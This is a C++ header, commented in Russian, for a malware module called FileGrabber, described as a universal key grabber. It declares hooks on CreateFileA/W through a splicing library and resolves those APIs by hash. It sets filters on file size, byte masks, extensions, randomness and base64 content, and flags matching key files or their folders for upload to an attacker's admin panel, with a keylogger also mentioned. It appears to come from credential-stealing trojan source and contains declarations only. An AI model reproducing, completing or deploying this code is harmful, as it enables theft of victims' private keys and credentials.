/*
Универсальный граббер ключей, осуществляется при помощи установки хуков на CreateFile
*/

#ifndef FileGrabberH
#define FileGrabberH

#include <windows.h>
#include "Splice.h"

namespace FileGrabber {

	struct ParamEvent
	{
		union
		{
			WCHAR fileNameW[MAX_PATH];
			char fileNameA[MAX_PATH];
		};
		char* fileName; //имя файла в ansi, если исходное в unicode, то тут будет в ansi (автоматически перекодируется)
		const char* shortName; //имя файла без пути
		const char* extFile; //расширение файла
		bool unicode; //true - вызов из CreateFileW, false - CreateFileA
		BYTE* data; //содержимое файла
		int szData; //размер файла, размер может быть и в отсутствии самих данных в data
		DWORD access; ////GENERIC_READ + GENERIC_WRITE
		HANDLE file;
		char nameSend[MAX_PATH]; //под каким именем отправлять файл, указывается получателем, по умолчанию FileGrabber
	};

	typedef int (*TypeFuncReceiver)( ParamEvent* ); //тип функции которой будем передавать управление

	//флаги получателя
	const int CREATEFILEA = 0x0001;
	const int CREATEFILEW = 0x0002;
	const int LOADFILE = 0x0004; //загружает файл (ложит в ParamEvent.data), но если есть маска, то загружает в любом случае
	const int SENDFILE = 0x0008; //возвращает получатель, если файл нужно отправить в админку (файл ключа)
	const int FILEISBIN = 0x0010; //проверка файла на частотность (случайный набор байт)
	const int CURRNAMEFILE = 0x0020; //возвращает получатель, отправлять в админку с именем файла переданным в CreateFile (без пути)
	const int FILEISBASE64 = 0x0040; //проверка файла на содержание кодировки base64
	const int CURRFULLNAMEFILE = 0x0080; //возвращает получатель, отправлять в админку с именем файла переданным в CreateFile с полнім путем
	const int SENDFOLDER = 0x0100; //отсылает папку в которой находится найденный файл, имя папки для кейлогера заносим в nameSend
	const int IGNOREHOOK = 0x0200; //игнорируем обработку хука
	const int INHOOK = 0x0400; //идет обработка хука, все остальные файлы игнорируется на это время
	const int STOPRECEIVER = 0x0800; //отключает получателя (необходимо если не нужно больше на него реагировать)

	const int MaxIgnoreBeg = 4; //максимальное количество игнорируемых форматов
	const int MaxLenIgnoreBeg = 4; //максимальная длина метки формата

	//Получатель и условия сообщения о входе в функцию CreateFile
	struct Receiver
	{
		int id;
		int minSize, maxSize; //минимальный и максимальный размер файла, если maxSize < 0, то файл больше minSize
		char* maska; //что должно находится в файле
		DWORD access; //GENERIC_READ + GENERIC_WRITE, по умолчанию ставится GENERIC_READ
		int aw; //CREATEFILEA - только для CreateFileA, CREATEFILEW - только для CreateFileW
		TypeFuncReceiver FuncReceiver; //функция получатель события
		char ignoreBeg[MaxIgnoreBeg][MaxLenIgnoreBeg]; //игнорирование файлов определенных форматов, у которых в начале стоят символы типа файла (в начале содержимого файла, для архивов, картинок)
							  //расчет максимум на 4-е формата, конец массива считается пустая строка (ignoreBeg[n][0] == 0)
		DWORD* ignoreExt; //игнорируемые расширения
		DWORD* neededExt; //нужные расширения
		bool ignore; //true - если нужно игнорировать этого получателя
	};

	typedef HANDLE (WINAPI *TypeCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);
	typedef HANDLE (WINAPI *TypeCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);

	const int Hash_CreateFileA = 0x8F8F114;
	const int Hash_CreateFileW = 0x8F8F102;

	extern TypeCreateFileW Real_CreateFileW;
	extern TypeCreateFileA Real_CreateFileA;

	extern PList receivers; //получатели

	//инициализация и установка хуков
	bool Init( int flags = CREATEFILEA | CREATEFILEW ); 
	//уничтожение списка получателей и убирание хуков 
	void Release();

	Receiver* CreateReceiver();
	bool AddReceiver( Receiver* );
	bool AddIgnoreBeg( Receiver*, const char* ); //добавляет игнорируемые форматы файлов, которые указываются в начале файла
	bool AddIgnoreExt( Receiver*, const DWORD* ); //добавляет массив хешей игнорируемых расширений файлов, должен заканчиваться нулем
	bool AddNeededExt( Receiver*, const DWORD* ); //добавляет массив хешей нужных нам расширений файлов, должен заканчиваться нулем
};

#endif //FileGrabberH
